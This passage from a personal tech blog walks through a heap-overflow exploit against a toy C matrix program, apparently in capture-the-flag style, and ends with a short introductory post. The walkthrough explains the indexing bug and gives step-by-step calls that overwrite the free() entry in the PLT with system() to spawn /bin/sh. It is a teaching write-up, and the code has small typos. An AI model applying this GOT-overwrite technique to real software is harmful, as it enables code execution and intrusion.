	<span class="k">return</span> <span class="o">&amp;</span><span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">row</span> <span class="o">*</span> <span class="n">mat</span><span class="o">-&gt;</span><span class="n">rows</span> <span class="o">+</span> <span class="n">col</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">float</span> <span class="nf">get</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">row</span><span class="p">,</span> <span class="kt">int</span> <span class="n">col</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">return</span> <span class="o">*</span><span class="n">get_addr</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">col</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">set</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">row</span><span class="p">,</span> <span class="kt">int</span> <span class="n">col</span><span class="p">,</span> <span class="kt">int</span> <span class="n">val</span><span class="p">)</span>
<span class="p">{</span>
	<span class="o">*</span><span class="n">get_addr</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">call</span><span class="p">)</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">allocate</span><span class="p">(</span><span class="kt">int</span> <span class="n">rows</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cols</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="n">get_free_id</span><span class="p">();</span> <span class="c1">// logic somewhere else</span>
	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">matrix</span><span class="p">));</span>
	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">rows</span> <span class="o">=</span> <span class="n">rows</span><span class="p">;</span>
	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">cols</span> <span class="o">=</span> <span class="n">cols</span><span class="p">;</span>
	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span> <span class="o">*</span> <span class="n">rows</span> <span class="o">*</span> <span class="n">cols</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">release</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">free</span><span class="p">(</span><span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
	<span class="n">free</span><span class="p">(</span><span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]);</span>
	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Can you find the bug? Hint: it’s in <code class="language-plaintext highlighter-rouge">get_addr</code>. The matrix indexing is
incorrect, it should be <code class="language-plaintext highlighter-rouge">row * mat-&gt;cols + col</code>. See the difference? This
overflow is what allows the shell to be spawned.</p>

<h2 id="a-note-on-float-conversion"><a href="#a-note-on-float-conversion">A note on float conversion</a></h2>

<p>In this program, memory is only accessible as floats. While inconvenient, this
is still usable as floats also take up the same space as ints, 4 bytes. With
enough digits, we can be guaranteed to get an identical value when we set it. To
find this value, we can use a union:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
		<span class="kt">float</span> <span class="n">b</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="c1">// set a or b here</span>
	<span class="c1">// e.g. a = 0x100</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"%8x %.9g"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Later on, we’ll also write strings. Since the system is little endian (x86), we
just use the characters’ ASCII value, in reverse order (for each 4-byte chunk).</p>

<h2 id="exploit-preparation"><a href="#exploit-preparation">Exploit Preparation</a></h2>

<p>Firstly, a bit on <code class="language-plaintext highlighter-rouge">malloc()</code>. It obtains memory from the system (usually via
<code class="language-plaintext highlighter-rouge">mmap()</code>), and divides it up into chunks. These are then allocated when
requested by the programmer. Since the block given is the first that fit the
size, this results in the matrices and their descriptors being allocated right
next to each other:</p>

<pre><code class="language-raw">+-------------+-------------------+-------------+-------------------+
| (sz) | mat1 | (sz) | mat1-&gt;data | (sz) | mat2 | (sz) | mat2-&gt;data |
+-------------+-------------------+-------------+-------------------+
</code></pre>
<p>As a result, we can exploit the bad indexing to overwrite the matrix descriptor
(in this case mat2) from the previous data block (mat1-&gt;data). Through this, we
can overwrite the data pointer of mat2 to whatever we want, allowing us to write
to any location in memory. One potential target is the plt (procedural link
table), which lists the location of functions of dynamically loaded libraries
(e.g. libc). However, one specific entry is of interest - <code class="language-plaintext highlighter-rouge">free()</code>. When
matrices are released, this is called on user-editable data, and with that as
the only argument. <code class="language-plaintext highlighter-rouge">system()</code> also takes a pointer as a single argument!</p>

<p>However, there is a problem: dynamic libraries can be loaded anywhere, and so
can <code class="language-plaintext highlighter-rouge">system()</code>. However, it is always at the same offset from <code class="language-plaintext highlighter-rouge">free()</code>, and we
can use that, along with the existing plt entry to calculate the position of
<code class="language-plaintext highlighter-rouge">system()</code>.</p>

<h2 id="actual-exploit"><a href="#actual-exploit">Actual Exploit</a></h2>

<p>First, we need to get some information:</p>

<pre><code class="language-raw">$ objdump -R matrix | grep free
0804a10c R_386_JUMP_SLOT   free
$ gdb -q matrix
Reading symbols from matrix...(no debugging symbols found)...done.
(gdb) p __libc_system - __libc_free
$1 = -228656
</code></pre>

<p>Now, we perform the actual exploit. First, we create 2 matrices which have more
rows than columns (e.g. 8*7). We then create and release another matrix. This is
required to initialize the plt entry to the actual location of <code class="language-plaintext highlighter-rouge">free()</code>
(<code class="language-plaintext highlighter-rouge">__libc_free()</code>), from which we can figure out the location of <code class="language-plaintext highlighter-rouge">system()</code> using
the offset. We now can use the overflowing get_addr logic to overwrite mat2’s
data pointer to point to 0x0804a10c (the address of the plt entry).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">allocate</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span> <span class="c1">// id 0</span>
<span class="n">allocate</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span> <span class="c1">// id 1</span>
<span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// id 2</span>
<span class="n">release</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now, how do we figure out where to write to overwrite that pointer? Since it’s
the last element of the struct, we search down from the top, until we get to the
second non-zero value. Why second? Because the first would be the size of the
next block, and we have no need overwriting that. From my tests, it appears that
with an 8*7 matrix, the value is located at [7,4], which we overwrite with the
float equivalent of 0x0804a10c.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">3.991161479e-34</span><span class="p">);</span> <span class="c1">// mat[7][4] = 0x0804a10c</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then, we can get the current value of the plt entry, which would be the address
of <code class="language-plaintext highlighter-rouge">__libc_free()</code>. We can add the offset (-228656) to this to get the address
of <code class="language-plaintext highlighter-rouge">__libc_system()</code> and overwrite the exiting value with this.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">get</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// returns -4.468552546e+33 == 0xf75c5110</span>
<span class="n">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mf">4.397786941e+33</span><span class="p">);</span> <span class="c1">// mat[0][0] = 0xf758d3e0 == (0xf75c5110 - 228656)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now that we have overwritten <code class="language-plaintext highlighter-rouge">free()</code>, we can write the payload, which is
“/bin/sh” (you can use any command here though). And we execute the command by
freeing that matrix.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="n">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mf">1.805717599e+28</span><span class="p">);</span> <span class="c1">// mat[0][0] = 0x6e69622f == '/bin'</span>
<span class="n">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mf">9.592211688e-39</span><span class="p">);</span> <span class="c1">// mat[0][0] = 0x0068732f == '/sh\0'</span>
<span class="n">release</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Shell!</p>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/initial-post">e4ecd8b Initial Post</a></h2>
  
    <div class="bounded"><p>This is the first post of the (hopefully long-lasting) blog. I’ll be writing
about a significant range of topics, from very low-level (e.g. assembly) to more
higher level topics (e.g. web development), and much in between.</p>

<!--more-->

<p>I started this since I had quite a few tech stories, and I thought, why not put
them on a blog? And here’s the first post.</p>

<p>Not much more to it at this point.</p>

<h2 id="2-hard-problems"><a href="#2-hard-problems">2 Hard Problems</a></h2>

<p>As once was said, one of the 2 hardest problems in computer science was naming
things, such as this blog. I didn’t (and probably don’t) have a good name for
this. For historical reference, at this point, it is called “triple except”, and
was chosen arbitrarily. This came from the x86 triple faults (faults ==
exceptions), which was an <a href="https://en.wikipedia.org/wiki/Triple_fault" title="Triple fault - Wikipedia">arbitrary article</a> I found on Wikipedia.</p>

</div>
  



		</main>

		<div id="site-footer" class="content-width text-centre">
		<ul class="li-flat mt-0">
			<li><a href="/everything">everything</a></li>
			<li><a href="/booklist">reading list</a></li>
		</ul>
		All work licensed under <b>CC BY-SA 4.0</b> unless otherwise stated.
		<br>
		This site is <a href="https://github.com/ralismark/ralismark.github.io">open source</a>!
</div>

	</body>
</html>
